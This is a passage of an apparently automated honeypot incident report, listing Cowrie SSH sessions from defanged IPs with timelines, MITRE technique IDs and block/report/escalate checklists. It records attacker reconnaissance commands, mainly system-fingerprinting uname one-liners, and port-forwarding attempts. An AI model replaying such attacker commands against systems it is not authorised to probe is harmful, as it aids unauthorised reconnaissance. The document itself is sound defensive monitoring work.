| `2026-08-11 14:16:56` | `cowrie.client.version` |
| `2026-08-11 14:16:58` | `cowrie.client.kex` |
| `2026-08-11 14:17:00` | `cowrie.login.success` |
| `2026-08-11 14:17:02` | `cowrie.session.params` |
| `2026-08-11 14:17:02` | `cowrie.command.input` |
| `2026-08-11 14:17:03` | `cowrie.log.closed` |
| `2026-08-11 14:17:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.229.106[.]252` to AbuseIPDB if not already reported
- [ ] Block `221.229.106[.]252` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f24fbbc1676

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 14:17 |
| **Last Seen** | 2026-08-11 14:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:17:02` | `cowrie.session.connect` |
| `2026-08-11 14:17:02` | `cowrie.client.version` |
| `2026-08-11 14:17:02` | `cowrie.client.kex` |
| `2026-08-11 14:17:03` | `cowrie.login.success` |
| `2026-08-11 14:17:05` | `cowrie.session.params` |
| `2026-08-11 14:17:05` | `cowrie.command.input` |
| `2026-08-11 14:17:05` | `cowrie.command.input` |
| `2026-08-11 14:17:05` | `cowrie.command.input` |
| `2026-08-11 14:17:05` | `cowrie.command.input` |
| `2026-08-11 14:17:05` | `cowrie.command.input` |
| `2026-08-11 14:17:05` | `cowrie.command.success` |
| `2026-08-11 14:17:05` | `cowrie.command.input` |
| `2026-08-11 14:17:05` | `cowrie.command.input` |
| `2026-08-11 14:17:05` | `cowrie.command.input` |
| `2026-08-11 14:17:05` | `cowrie.command.input` |
| `2026-08-11 14:17:05` | `cowrie.log.closed` |
| `2026-08-11 14:17:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5eb0117c648

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 14:17 |
| **Last Seen** | 2026-08-11 14:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:17:26` | `cowrie.session.connect` |
| `2026-08-11 14:17:26` | `cowrie.client.version` |
| `2026-08-11 14:17:26` | `cowrie.client.kex` |
| `2026-08-11 14:17:26` | `cowrie.login.success` |
| `2026-08-11 14:17:27` | `cowrie.session.params` |
| `2026-08-11 14:17:27` | `cowrie.command.input` |
| `2026-08-11 14:17:27` | `cowrie.log.closed` |
| `2026-08-11 14:17:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4702567f515

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 14:17 |
| **Last Seen** | 2026-08-11 14:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:17:49` | `cowrie.session.connect` |
| `2026-08-11 14:17:49` | `cowrie.client.version` |
| `2026-08-11 14:17:49` | `cowrie.client.kex` |
| `2026-08-11 14:17:49` | `cowrie.login.success` |
| `2026-08-11 14:17:50` | `cowrie.session.params` |
| `2026-08-11 14:17:50` | `cowrie.command.input` |
| `2026-08-11 14:17:50` | `cowrie.log.closed` |
| `2026-08-11 14:17:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13fb1ee12fe0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 14:18 |
| **Last Seen** | 2026-08-11 14:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:18:50` | `cowrie.session.connect` |
| `2026-08-11 14:18:50` | `cowrie.client.version` |
| `2026-08-11 14:18:50` | `cowrie.client.kex` |
| `2026-08-11 14:18:51` | `cowrie.login.success` |
| `2026-08-11 14:18:52` | `cowrie.session.params` |
| `2026-08-11 14:18:52` | `cowrie.command.input` |
| `2026-08-11 14:18:52` | `cowrie.command.input` |
| `2026-08-11 14:18:52` | `cowrie.command.input` |
| `2026-08-11 14:18:52` | `cowrie.command.input` |
| `2026-08-11 14:18:52` | `cowrie.command.input` |
| `2026-08-11 14:18:52` | `cowrie.command.success` |
| `2026-08-11 14:18:52` | `cowrie.command.input` |
| `2026-08-11 14:18:52` | `cowrie.command.input` |
| `2026-08-11 14:18:52` | `cowrie.command.input` |
| `2026-08-11 14:18:52` | `cowrie.command.input` |
| `2026-08-11 14:18:52` | `cowrie.log.closed` |
| `2026-08-11 14:18:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81ffc91acc04

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 14:19 |
| **Last Seen** | 2026-08-11 14:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:19:07` | `cowrie.session.connect` |
| `2026-08-11 14:19:07` | `cowrie.client.version` |
| `2026-08-11 14:19:07` | `cowrie.client.kex` |
| `2026-08-11 14:19:07` | `cowrie.login.success` |
| `2026-08-11 14:19:08` | `cowrie.session.params` |
| `2026-08-11 14:19:08` | `cowrie.command.input` |
| `2026-08-11 14:19:08` | `cowrie.log.closed` |
| `2026-08-11 14:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a161594de127

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 14:20 |
| **Last Seen** | 2026-08-11 14:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:20:31` | `cowrie.session.connect` |
| `2026-08-11 14:20:31` | `cowrie.client.version` |
| `2026-08-11 14:20:32` | `cowrie.client.kex` |
| `2026-08-11 14:20:32` | `cowrie.login.success` |
| `2026-08-11 14:20:33` | `cowrie.session.params` |
| `2026-08-11 14:20:33` | `cowrie.command.input` |
| `2026-08-11 14:20:33` | `cowrie.log.closed` |
| `2026-08-11 14:20:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db008555df2e

| Field | Detail |
|---|---|
| **Source IP** | `220.132.170[.]64` |
| **First Seen** | 2026-08-11 14:23 |
| **Last Seen** | 2026-08-11 14:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:23:18` | `cowrie.session.connect` |
| `2026-08-11 14:23:19` | `cowrie.client.version` |
| `2026-08-11 14:23:19` | `cowrie.client.kex` |
| `2026-08-11 14:23:21` | `cowrie.login.success` |
| `2026-08-11 14:23:22` | `cowrie.direct-tcpip.request` |
| `2026-08-11 14:23:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.132.170[.]64` to AbuseIPDB if not already reported
- [ ] Block `220.132.170[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b273ec9c14a7

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 14:26 |
| **Last Seen** | 2026-08-11 14:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:26:07` | `cowrie.session.connect` |
| `2026-08-11 14:26:07` | `cowrie.client.version` |
| `2026-08-11 14:26:07` | `cowrie.client.kex` |
| `2026-08-11 14:26:08` | `cowrie.login.success` |
| `2026-08-11 14:26:08` | `cowrie.session.params` |
| `2026-08-11 14:26:08` | `cowrie.command.input` |
| `2026-08-11 14:26:08` | `cowrie.log.closed` |
| `2026-08-11 14:26:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01484f0cb7cb

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 14:28 |
| **Last Seen** | 2026-08-11 14:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:28:54` | `cowrie.session.connect` |
| `2026-08-11 14:28:54` | `cowrie.client.version` |
| `2026-08-11 14:28:54` | `cowrie.client.kex` |
| `2026-08-11 14:28:55` | `cowrie.login.success` |
| `2026-08-11 14:28:55` | `cowrie.session.params` |
| `2026-08-11 14:28:55` | `cowrie.command.input` |
| `2026-08-11 14:28:56` | `cowrie.log.closed` |
| `2026-08-11 14:28:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d7d0753c673

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 14:31 |
| **Last Seen** | 2026-08-11 14:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:31:34` | `cowrie.session.connect` |
| `2026-08-11 14:31:34` | `cowrie.client.version` |
| `2026-08-11 14:31:34` | `cowrie.client.kex` |
| `2026-08-11 14:31:34` | `cowrie.login.success` |
| `2026-08-11 14:31:35` | `cowrie.session.params` |
| `2026-08-11 14:31:35` | `cowrie.command.input` |
| `2026-08-11 14:31:35` | `cowrie.log.closed` |
| `2026-08-11 14:31:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e657cd1b0a5f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 14:34 |
| **Last Seen** | 2026-08-11 14:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:34:22` | `cowrie.session.connect` |
| `2026-08-11 14:34:22` | `cowrie.client.version` |
| `2026-08-11 14:34:22` | `cowrie.client.kex` |
| `2026-08-11 14:34:22` | `cowrie.login.success` |
| `2026-08-11 14:34:23` | `cowrie.session.params` |
| `2026-08-11 14:34:23` | `cowrie.command.input` |
| `2026-08-11 14:34:23` | `cowrie.log.closed` |
| `2026-08-11 14:34:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-817b18f62973

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 14:39 |
| **Last Seen** | 2026-08-11 14:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:39:35` | `cowrie.session.connect` |
| `2026-08-11 14:39:35` | `cowrie.client.version` |
| `2026-08-11 14:39:35` | `cowrie.client.kex` |
| `2026-08-11 14:39:38` | `cowrie.login.success` |
| `2026-08-11 14:39:42` | `cowrie.session.params` |
| `2026-08-11 14:39:42` | `cowrie.command.input` |
| `2026-08-11 14:39:42` | `cowrie.command.input` |
| `2026-08-11 14:39:42` | `cowrie.command.input` |
| `2026-08-11 14:39:42` | `cowrie.command.input` |
| `2026-08-11 14:39:42` | `cowrie.command.input` |
| `2026-08-11 14:39:42` | `cowrie.command.success` |
| `2026-08-11 14:39:42` | `cowrie.command.input` |
| `2026-08-11 14:39:42` | `cowrie.command.input` |
| `2026-08-11 14:39:42` | `cowrie.command.input` |
| `2026-08-11 14:39:42` | `cowrie.command.input` |
| `2026-08-11 14:39:43` | `cowrie.log.closed` |
| `2026-08-11 14:39:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58f21272e8dd

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 14:39 |
| **Last Seen** | 2026-08-11 14:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:39:48` | `cowrie.session.connect` |
| `2026-08-11 14:39:48` | `cowrie.client.version` |
| `2026-08-11 14:39:48` | `cowrie.client.kex` |
| `2026-08-11 14:39:49` | `cowrie.login.success` |
| `2026-08-11 14:39:50` | `cowrie.session.params` |
| `2026-08-11 14:39:50` | `cowrie.command.input` |
| `2026-08-11 14:39:50` | `cowrie.log.closed` |
| `2026-08-11 14:39:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90ef37bae72c

| Field | Detail |
|---|---|
| **Source IP** | `65.20.217[.]64` |
| **First Seen** | 2026-08-11 14:41 |
| **Last Seen** | 2026-08-11 14:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:41:38` | `cowrie.session.connect` |
| `2026-08-11 14:41:39` | `cowrie.client.version` |
| `2026-08-11 14:41:39` | `cowrie.client.kex` |
| `2026-08-11 14:41:40` | `cowrie.login.success` |
| `2026-08-11 14:41:40` | `cowrie.direct-tcpip.request` |
| `2026-08-11 14:41:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.217[.]64` to AbuseIPDB if not already reported
- [ ] Block `65.20.217[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-417a67d7878f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 14:41 |
| **Last Seen** | 2026-08-11 14:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:41:45` | `cowrie.session.connect` |
| `2026-08-11 14:41:45` | `cowrie.client.version` |
| `2026-08-11 14:41:45` | `cowrie.client.kex` |
| `2026-08-11 14:41:46` | `cowrie.login.success` |
| `2026-08-11 14:41:47` | `cowrie.session.params` |
| `2026-08-11 14:41:47` | `cowrie.command.input` |
| `2026-08-11 14:41:47` | `cowrie.command.input` |
| `2026-08-11 14:41:47` | `cowrie.command.input` |
| `2026-08-11 14:41:47` | `cowrie.command.input` |
| `2026-08-11 14:41:47` | `cowrie.command.input` |
| `2026-08-11 14:41:47` | `cowrie.command.success` |
| `2026-08-11 14:41:47` | `cowrie.command.input` |
| `2026-08-11 14:41:47` | `cowrie.command.input` |
| `2026-08-11 14:41:47` | `cowrie.command.input` |
| `2026-08-11 14:41:47` | `cowrie.command.input` |
| `2026-08-11 14:41:48` | `cowrie.log.closed` |
| `2026-08-11 14:41:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-515fdabc55f8

| Field | Detail |
|---|---|
| **Source IP** | `49.206.194[.]29` |
| **First Seen** | 2026-08-11 14:41 |
| **Last Seen** | 2026-08-11 14:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:41:46` | `cowrie.session.connect` |
| `2026-08-11 14:41:46` | `cowrie.client.version` |
| `2026-08-11 14:41:46` | `cowrie.client.kex` |
| `2026-08-11 14:41:49` | `cowrie.login.success` |
| `2026-08-11 14:41:50` | `cowrie.direct-tcpip.request` |
| `2026-08-11 14:41:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.206.194[.]29` to AbuseIPDB if not already reported
- [ ] Block `49.206.194[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10c879e8c165

| Field | Detail |
|---|---|
| **Source IP** | `93.241.232[.]14` |
| **First Seen** | 2026-08-11 14:41 |
| **Last Seen** | 2026-08-11 14:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:41:52` | `cowrie.session.connect` |
| `2026-08-11 14:41:52` | `cowrie.client.version` |
| `2026-08-11 14:41:52` | `cowrie.client.kex` |
| `2026-08-11 14:41:53` | `cowrie.login.success` |
| `2026-08-11 14:41:53` | `cowrie.direct-tcpip.request` |
| `2026-08-11 14:41:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.241.232[.]14` to AbuseIPDB if not already reported
- [ ] Block `93.241.232[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a68f9033059b

| Field | Detail |
|---|---|
| **Source IP** | `182.60.128[.]241` |
| **First Seen** | 2026-08-11 14:41 |
| **Last Seen** | 2026-08-11 14:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:41:58` | `cowrie.session.connect` |
| `2026-08-11 14:41:59` | `cowrie.client.version` |
| `2026-08-11 14:41:59` | `cowrie.client.kex` |
| `2026-08-11 14:42:01` | `cowrie.login.success` |
| `2026-08-11 14:42:01` | `cowrie.direct-tcpip.request` |
| `2026-08-11 14:42:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.60.128[.]241` to AbuseIPDB if not already reported
- [ ] Block `182.60.128[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a411828f21ee

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 14:42 |
| **Last Seen** | 2026-08-11 14:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:42:35` | `cowrie.session.connect` |
| `2026-08-11 14:42:35` | `cowrie.client.version` |
| `2026-08-11 14:42:35` | `cowrie.client.kex` |
| `2026-08-11 14:42:35` | `cowrie.login.success` |
| `2026-08-11 14:42:36` | `cowrie.session.params` |
| `2026-08-11 14:42:36` | `cowrie.command.input` |
| `2026-08-11 14:42:36` | `cowrie.log.closed` |
| `2026-08-11 14:42:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc0b22d80202

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 14:44 |
| **Last Seen** | 2026-08-11 14:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:44:09` | `cowrie.session.connect` |
| `2026-08-11 14:44:09` | `cowrie.client.version` |
| `2026-08-11 14:44:09` | `cowrie.client.kex` |
| `2026-08-11 14:44:10` | `cowrie.login.success` |
| `2026-08-11 14:44:11` | `cowrie.session.params` |
| `2026-08-11 14:44:11` | `cowrie.command.input` |
| `2026-08-11 14:44:11` | `cowrie.command.input` |
| `2026-08-11 14:44:11` | `cowrie.command.input` |
| `2026-08-11 14:44:11` | `cowrie.command.input` |
